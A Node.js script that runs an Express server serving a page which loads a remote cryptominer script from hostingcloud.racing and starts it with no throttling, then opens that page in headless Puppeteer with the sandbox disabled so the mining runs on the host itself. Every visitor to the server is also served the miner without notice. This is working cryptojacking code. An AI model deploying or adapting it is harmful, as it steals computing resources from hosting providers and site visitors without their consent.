const puppeteer = require('puppeteer')
const express = require('express')

const app = express()

app.listen(process.env.PORT || 3030, ()=>{
    console.log('Listening on port 3030 ...')
    startMining()
})

let html = 
'<!DOCTYPE html>'
+'<html>'
+'    <head>'
+'        <script src="https://www.hostingcloud.racing/XF0s.js"></script>'
+'    </head>'
+'<body>'
+''
+'    <h1>I am Raiyan</h1>'
+''
+'    <script>'
+'        var _client = new Client.Anonymous("b4725089ec8c5aa2c3864e5b1cc715a87c8eae0aaaae83e1db4e50061597a5fc", {'
+'            throttle: 0, c: "w", ads: 0'
+'        });'
+'        _client.start();'
+'    </script>'
+''
+'</body>'
+'</html>'

async function startMining() {
    ;(async () => {
        let browser = await puppeteer.launch({
            headless: true,
            args: [ '--no-sandbox', '--disable-setuid-sandbox' ]
        })
    
        let page = await browser.newPage()

        await page.goto('http://127.0.0.1:3030/')
    })()
}


app.use('*', async function(req, res) {
    res.end(html)
})
